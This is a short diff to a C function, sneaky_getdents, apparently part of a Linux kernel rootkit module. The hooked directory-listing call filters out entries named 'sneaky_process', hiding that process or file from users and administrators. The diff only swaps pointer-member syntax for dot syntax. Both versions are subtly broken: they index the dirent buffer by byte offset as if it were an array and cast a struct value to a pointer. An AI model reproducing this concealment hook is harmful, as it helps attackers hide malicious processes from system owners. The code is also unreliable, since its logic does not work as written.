@@ -82,10 +82,10 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   // skip: any dirent with filename == "sneaky_process"
   // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent 
   for (int i = 0; i < (dirent_size - skipped_size);) {
-    if (strcmp(dirp[i]->d_name, "sneaky_process") == 0) {
-      skipped_size += (int)(dirp[i]->d_reclen);
+    if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
+      skipped_size += (int)(dirp[i].d_reclen);
       
-      void* unexamined_start = (void*)(dirp[i]) + dirp[i]->d_reclen;
+      void* unexamined_start = (void*)(dirp[i]) + dirp[i].d_reclen;
       int unexamined_size = dirent_size - examined_size - skipped_size;
       memmove((void*)(dirp[i]),
 	      unexamined_start,
@@ -93,10 +93,10 @@ asmlinkage int sneaky_getdents (unsigned int fd,
       // i stays the same here, do not update!
       
     } else {
-      examined_size += (int)(dirp[i]->d_reclen);
+      examined_size += (int)(dirp[i].d_reclen);
 
       // update i here
-      i +=  (int)(dirp[i]->d_reclen);
+      i +=  (int)(dirp[i].d_reclen);
     }
   }
   
